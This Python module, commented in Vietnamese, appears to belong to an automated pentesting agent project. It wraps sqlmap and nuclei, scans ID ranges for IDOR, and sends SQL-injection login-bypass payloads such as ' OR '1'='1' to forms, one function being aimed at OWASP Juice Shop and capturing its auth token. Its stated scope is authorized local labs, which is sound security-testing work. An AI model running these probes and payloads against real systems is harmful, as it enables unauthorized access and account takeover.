"""
Tool Integration — Chương 4.4

Wrapper mỏng quanh các công cụ pentest thật. Mỗi hàm trả về dict chuẩn hoá
{"success": bool, "raw": str, "summary": str} để Execution-Evaluator Agent
dễ đọc và ghi vào ActionRecord.

LƯU Ý QUAN TRỌNG: các wrapper này CHỈ được gọi nhắm vào target đã được phép
kiểm thử (DVWA / Juice Shop chạy local trong docker của chính bạn, hoặc CTF
lab được cấp phép). Không dùng để quét/khai thác hệ thống không được cho phép.
"""

from __future__ import annotations
import shutil
import subprocess
import requests
from dataclasses import dataclass


@dataclass
class ToolResult:
    success: bool
    raw: str
    summary: str
    token: str = None


def _tool_available(name: str) -> bool:
    return shutil.which(name) is not None


# --------------------------------------------------------------------------- #
# SQLMap
# --------------------------------------------------------------------------- #

def run_sqlmap(url: str, param: str, extra_args: list[str] | None = None, timeout: int = 120) -> ToolResult:
    if not _tool_available("sqlmap"):
        return ToolResult(False, "", "sqlmap không có trong PATH — cài đặt hoặc dùng docker image sqlmapproject/sqlmap")

    cmd = ["sqlmap", "-u", url, "-p", param, "--batch", "--level=2", "--risk=1"]
    if extra_args:
        cmd += extra_args
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        out = proc.stdout + proc.stderr
        injectable = "is vulnerable" in out or "parameter" in out.lower() and "injectable" in out.lower()
        return ToolResult(
            success=injectable,
            raw=out[-4000:],
            summary=f"sqlmap on {url} param={param}: {'INJECTABLE' if injectable else 'no injection found'}",
        )
    except subprocess.TimeoutExpired:
        return ToolResult(False, "", f"sqlmap timeout sau {timeout}s")


# --------------------------------------------------------------------------- #
# Nuclei
# --------------------------------------------------------------------------- #

def run_nuclei(url: str, templates: str = "cves,exposures,vulnerabilities", timeout: int = 120) -> ToolResult:
    if not _tool_available("nuclei"):
        return ToolResult(False, "", "nuclei không có trong PATH — cài đặt: https://github.com/projectdiscovery/nuclei")

    cmd = ["nuclei", "-u", url, "-tags", templates, "-jsonl", "-silent"]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        lines = [l for l in proc.stdout.splitlines() if l.strip()]
        return ToolResult(
            success=len(lines) > 0,
            raw="\n".join(lines[-50:]),
            summary=f"nuclei on {url}: {len(lines)} finding(s)",
        )
    except subprocess.TimeoutExpired:
        return ToolResult(False, "", f"nuclei timeout sau {timeout}s")


# --------------------------------------------------------------------------- #
# Raw HTTP recon / IDOR / auth-bypass probing (Requests module)
# --------------------------------------------------------------------------- #

def http_get(url: str, params: dict | None = None, cookies: dict | None = None, timeout: int = 10) -> ToolResult:
    try:
        r = requests.get(url, params=params, cookies=cookies, timeout=timeout)
        return ToolResult(
            success=r.status_code < 400,
            raw=r.text[:4000],
            summary=f"GET {url} -> {r.status_code}, {len(r.content)} bytes",
        )
    except requests.RequestException as e:
        return ToolResult(False, "", f"HTTP GET lỗi: {e}")


def probe_idor(base_url: str, path_template: str, id_range: range, cookies: dict | None = None) -> ToolResult:
    """
    Duyệt qua id_range, thay {id} trong path_template, ghi nhận những response
    200 mà lẽ ra phải bị 403/401 nếu access control đúng. Đây là "confidence
    probe" nhẹ trước khi VulnerabilityState chuyển CANDIDATE -> CONFIRMED.
    """
    hits = []
    for i in id_range:
        url = base_url + path_template.format(id=i)
        try:
            r = requests.get(url, cookies=cookies, timeout=8)
            if r.status_code == 200:
                hits.append(i)
        except requests.RequestException:
            continue
    return ToolResult(
        success=len(hits) > 0,
        raw=str(hits),
        summary=f"IDOR probe {path_template}: {len(hits)} object(s) truy cập được ngoài phạm vi user hiện tại",
    )


def try_auth_bypass_payloads(login_url: str, username_field: str, password_field: str,
                              payloads: list[str] | None = None) -> ToolResult:
    """
    Thử một tập payload SQLi cổ điển cho auth bypass (' OR '1'='1 và biến thể).
    Đây là hành động "candidate exploit" cho VulnType.AUTH_BYPASS — không phải
    brute force mật khẩu.
    """
    payloads = payloads or ["' OR '1'='1' -- -", "admin'-- -", "' OR 1=1#"]
    for p in payloads:
        try:
            r = requests.post(login_url, data={username_field: p, password_field: p}, timeout=8, allow_redirects=True)
            if r.status_code == 200 and ("logout" in r.text.lower() or "welcome" in r.text.lower()):
                return ToolResult(True, r.text[:2000], f"Auth bypass thành công với payload: {p}")
        except requests.RequestException:
            continue
    return ToolResult(False, "", "Không payload nào bypass được auth")


def try_auth_bypass_payloads_juiceshop(login_url, payloads=None):
    payloads = payloads or ["' OR 1=1--", "' OR '1'='1", "admin@juice-sh.op'--"]
    for p in payloads:
        try:
            r = requests.post(login_url, json={"email": p, "password": "anything"}, timeout=8,
                               headers={"Content-Type": "application/json"})
            if r.status_code == 200:
                body = r.text.lower()
                if "token" in body or "authentication" in body:
                    token = None
                    try:
                        data = r.json()
                        token = data.get("authentication", {}).get("token")
                    except Exception:
                        pass
                    return ToolResult(True, r.text[:2000], f"Auth bypass thành công với payload email: {p}", token=token)
        except requests.RequestException:
            continue
    return ToolResult(False, "", "Không payload nào bypass được auth (Juice Shop)")


def probe_idor_juiceshop(base_url, path_template, id_range, bearer_token=None, own_basket_id=None):
    """
    Chỉ tính là IDOR thật khi lấy được basket có UserId KHÁC với user hiện tại.
    """
    headers = {"Authorization": f"Bearer {bearer_token}"} if bearer_token else {}

    def _safe_user_id(resp):
        try:
            body = resp.json()
        except ValueError:
            return None
        if not isinstance(body, dict):
            return None
        data = body.get("data")
        if not isinstance(data, dict):
            return None
        return data.get("UserId")

    own_user_id = None
    if own_basket_id is not None:
        try:
            r = requests.get(base_url + path_template.format(id=own_basket_id), headers=headers, timeout=8)
            if r.status_code == 200:
                own_user_id = _safe_user_id(r)
        except requests.RequestException:
            pass

    hits = []
    checked_200 = []
    for i in id_range:
        if i == own_basket_id:
            continue
        url = base_url + path_template.format(id=i)
        try:
            r = requests.get(url, headers=headers, timeout=8)
            if r.status_code == 200:
                checked_200.append(i)
                if own_user_id is not None:
                    resp_user_id = _safe_user_id(r)
                    if resp_user_id is not None and resp_user_id != own_user_id:
                        hits.append(i)
                else:
                    hits.append(i)
        except requests.RequestException:
            continue

    note = f"(đã loại trừ basket của chính mình id={own_basket_id})" if own_basket_id is not None else "(không xác định được basket của chính mình)"
    return ToolResult(
        len(hits) > 0, str(hits),
        f"IDOR probe (Juice Shop) {path_template}: {len(hits)}/{len(checked_200)} object(s) thuộc user KHÁC bị truy cập trái phép {note}"
    )
